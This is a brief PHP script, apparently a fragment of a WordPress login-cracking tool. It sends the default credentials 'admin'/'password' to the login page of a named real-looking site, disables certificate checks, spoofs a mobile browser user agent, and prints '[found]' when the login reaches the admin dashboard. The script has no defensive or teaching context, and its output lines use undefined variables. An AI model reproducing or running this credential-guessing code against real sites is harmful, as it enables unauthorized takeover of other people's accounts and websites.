<?php                                 

 
$url='https://europeanit-inst.com/wp-login.php' ;
$uid='admin';
$pass='password';
$ck="coockes.txt";
$data = "log=" . $uid . "&pwd=" . $pass . "&wp-submit=Log";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

 curl_setopt($curl, CURLOPT_HEADER, true);
 curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($curl, CURLOPT_COOKIEJAR, $ck);
curl_setopt($curl, CURLOPT_COOKIEFILE, $ck);
   curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 12; M2102J20SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36");
 
curl_setopt($curl, CURLINFO_HEADER_OUT, true);
 
  $ex = curl_exec($curl) or die('<font color="red">Can\'t Connect to Host</font>');


$url = curl_getinfo($curl, CURLINFO_EFFECTIVE_URL);


$f3 = "wp-admin";
     if(strpos($url, $f3) !== false){
echo "[found]  $do
"; }
else {
echo "$red [not found]  $blu $do 

" ; }
curl_close($curl);

?>
				